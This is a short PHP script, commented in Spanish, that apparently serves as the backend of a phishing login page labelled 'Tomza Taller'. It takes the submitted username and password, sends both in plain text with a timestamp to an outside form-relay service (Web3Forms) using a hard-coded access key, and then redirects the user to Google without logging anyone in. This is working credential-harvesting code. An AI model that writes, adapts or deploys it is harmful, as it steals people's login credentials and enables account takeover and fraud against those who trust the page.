<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir y limpiar los datos
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Validar que no estén vacíos
if ($usuario === "" || $password === "") {
    die("Faltan datos.");
}

// Tu clave de Web3Forms
$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";

// Datos que se enviarán
$datos = [
    "access_key" => $access_key,
    "subject" => "Nuevo ingreso - Tomza Taller",
    "Usuario" => $usuario,
    "Contraseña" => $password,
    "Fecha y hora" => date("d/m/Y H:i:s")
];

// Configuración de envío
$opciones = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
        "method" => "POST",
        "content" => http_build_query($datos),
        "timeout" => 10
    ]
];

// Enviar y capturar el resultado
$contexto = stream_context_create($opciones);
$resultado = file_get_contents("https://api.web3forms.com/submit", false, $contexto);

if ($resultado === false) {
    // Si falla, mostrará el error real en pantalla
    echo "Error al conectar con Web3Forms: ";
    print_r(error_get_last());
} else {
    // Si tiene éxito, redirigir
    header("Location: https://www.google.com");
}
exit;
?>
